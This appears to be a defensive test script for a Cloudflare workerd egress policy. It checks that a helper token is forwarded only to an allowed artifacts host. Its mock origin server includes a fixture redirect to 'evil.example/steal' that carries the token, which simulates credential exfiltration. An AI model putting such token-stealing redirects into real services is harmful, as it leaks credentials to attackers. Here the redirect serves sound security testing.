#!/usr/bin/env node
import fs from "node:fs";
import http from "node:http";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const SCRIPT = fileURLToPath(import.meta.url);
const ROOT = path.resolve(path.dirname(SCRIPT), "..");
const RUNTIME_ROOT = path.join(ROOT, "node_modules/.pnpm/node_modules/@alchemy.run/cloudflare-runtime");
const EFFECT_ROOT = path.join(ROOT, "node_modules/.pnpm/effect@4.0.2/node_modules/effect/dist");
const NODE_SERVICES = path.join(ROOT, "node_modules/.pnpm/@effect+platform-node@4.0.2_effect@4.0.2_redis@6.3.0/node_modules/@effect/platform-node/dist/NodeServices.js");
const ROLLDOWN_PACKAGE = path.join(ROOT, "node_modules/.pnpm/node_modules/rolldown/dist/index.mjs");
const HELPER_TOKEN = "runtime-helper-token-should-not-appear";
const PROVIDER_HOST = "artifacts.example";
const REPOSITORY = "gfy.demo.0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
const COMPATIBILITY_DATE = "2026-09-25";
const COMPATIBILITY_FLAGS = ["nodejs_compat"];

const results = [];

function note(name, detail = {}) {
  results.push({ name, ok: true, ...detail });
}

function fail(name, detail = {}) {
  results.push({ name, ok: false, ...detail });
  throw new Error(`${name}: ${JSON.stringify(detail)}`);
}

function assertRuntime(name, condition, detail = {}) {
  if (!condition) fail(name, detail);
  note(name, detail);
}

function rel(file) {
  return path.relative(ROOT, file);
}

async function importModule(absPath) {
  return import(pathToFileURL(absPath).href);
}

async function loadRuntime() {
  const files = {
    effect: path.join(EFFECT_ROOT, "Effect.js"),
    layer: path.join(EFFECT_ROOT, "Layer.js"),
    nodeServices: NODE_SERVICES,
    workerd: path.join(RUNTIME_ROOT, "dist/core/node/workerd/Workerd.mjs"),
    rolldown: ROLLDOWN_PACKAGE,
    workersTypes: path.join(ROOT, "node_modules/@cloudflare/workers-types/index.d.ts")
  };
  for (const [name, file] of Object.entries(files)) assertRuntime(`runtime module exists: ${name}`, fs.existsSync(file), { file: rel(file) });
  const [Effect, Layer, NodeServices, Workerd, { rolldown }] = await Promise.all([
    importModule(files.effect),
    importModule(files.layer),
    importModule(files.nodeServices),
    importModule(files.workerd),
    importModule(files.rolldown)
  ]);
  return { Effect, Layer, NodeServices, Workerd, rolldown };
}

async function bundleProbe(rolldown) {
  const bundle = await rolldown({
    input: path.join(ROOT, "tests/runtime/git-egress-probe.ts"),
    external: ["cloudflare:workers"],
    treeshake: false
  });
  const output = await bundle.generate({ format: "es", codeSplitting: false, sourcemap: false });
  const chunk = output.output.find((item) => item.type === "chunk");
  if (!chunk) fail("git egress probe bundle emitted chunk", { output: output.output.map((item) => item.type) });
  assertRuntime("git egress source bundles for workerd", chunk.code.includes("GitFoundryArtifactsEgress"), { bytes: chunk.code.length });
  return chunk.code;
}

async function withOriginServer(callback) {
  const requests = [];
  const server = http.createServer((request, response) => {
    let bodyBytes = 0;
    request.on("data", (chunk) => { bodyBytes += chunk.byteLength; });
    request.on("end", () => {
      requests.push({ method: request.method, url: request.url, host: request.headers.host, authorization: request.headers.authorization, bodyBytes });
      if (request.url === `/${REPOSITORY}.git/git-receive-pack`) {
        response.writeHead(302, { location: `https://evil.example/steal?token=${HELPER_TOKEN}` });
        response.end(`redirect ${HELPER_TOKEN}`);
        return;
      }
      response.writeHead(200, { "content-type": request.url?.includes("info/refs") ? "application/x-git-upload-pack-advertisement" : "application/x-git-upload-pack-result" });
      response.end("git-ok");
    });
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  try {
    return await callback({ port: server.address().port, requests });
  } finally {
    await new Promise((resolve) => server.close(resolve));
  }
}

async function withWorkerd(runtime, config, callback) {
  const { Effect, Layer, NodeServices, Workerd } = runtime;
  const services = Layer.provide(Workerd.WorkerdLive, NodeServices.layer);
  const program = Effect.scoped(Effect.gen(function* () {
    const workerd = yield* Workerd.Workerd;
    const ports = yield* workerd.serve(config);
    return yield* Effect.promise(() => callback(ports));
  }));
  return Effect.runPromise(Effect.provide(program, services));
}

async function runProbe(runtime, code) {
  return withOriginServer(async ({ port, requests }) => {
    const result = await withWorkerd(runtime, {
      sockets: [{ name: "probe", address: "127.0.0.1:0", service: { name: "probe" } }],
      services: [
        { name: "origin", external: { address: `127.0.0.1:${port}`, http: {} } },
        { name: "probe", worker: { compatibilityDate: COMPATIBILITY_DATE, compatibilityFlags: COMPATIBILITY_FLAGS, globalOutbound: { name: "origin" }, modules: [{ name: "index.js", esModule: code }] } }
      ]
    }, async (ports) => {
      const response = await fetch(`http://127.0.0.1:${ports.probe}/probe`, { headers: { "x-fixture-helper-token": HELPER_TOKEN }, signal: AbortSignal.timeout(10_000) });
      const text = await response.text();
      return { status: response.status, text, json: JSON.parse(text) };
    });

    assertRuntime("actual ctx.exports Fetcher supplied to probe", result.status === 200 && result.json?.ctx_exports_fetcher === true, { status: result.status });
    assertRuntime("probe policy checks passed", result.json?.ok === true, { failed: result.json?.checks?.filter((check) => !check.ok).map((check) => check.name) ?? [] });
    const sanitizedRequests = requests.map((request) => ({ method: request.method, url: request.url, host: request.host, authorizationWasForwarded: request.authorization === `Bearer ${HELPER_TOKEN}`, bodyBytes: request.bodyBytes }));
    assertRuntime("only allowed origin requests reached simulated Artifacts", requests.length === 3 && requests.every((request) => request.host === PROVIDER_HOST), { requests: sanitizedRequests });
    assertRuntime("helper token forwarded only to Artifacts origin", requests.every((request) => request.authorization === `Bearer ${HELPER_TOKEN}`), { requestCount: requests.length });
    assertRuntime("arbitrary host and path denials did not reach origin", !requests.some((request) => request.host === "evil.example" || request.url?.includes("other.git")), { requests: sanitizedRequests });
    assertRuntime("runtime output omits helper token", !result.text.includes(HELPER_TOKEN) && !JSON.stringify(sanitizedRequests).includes(HELPER_TOKEN), { responseBytes: result.text.length });
    return { probe: result.json, requests: sanitizedRequests };
  });
}

async function main() {
  const runtime = await loadRuntime();
  const code = await bundleProbe(runtime.rolldown);
  const proof = await runProbe(runtime, code);
  const summary = { ok: results.every((result) => result.ok), checkedAt: new Date().toISOString(), runtime: "@alchemy.run/cloudflare-runtime Workerd.serve", compatibilityDate: COMPATIBILITY_DATE, compatibilityFlags: COMPATIBILITY_FLAGS, proof, results };
  const text = JSON.stringify(summary, null, 2);
  if (text.includes(HELPER_TOKEN)) fail("summary must not include helper token");
  console.log(text);
  if (!summary.ok) process.exitCode = 1;
}

main().catch((error) => {
  const summary = { ok: false, runtime: "@alchemy.run/cloudflare-runtime Workerd.serve", error: error instanceof Error ? error.message.replaceAll(HELPER_TOKEN, "[redacted]") : String(error).replaceAll(HELPER_TOKEN, "[redacted]"), results };
  console.error(JSON.stringify(summary, null, 2));
  process.exit(1);
});
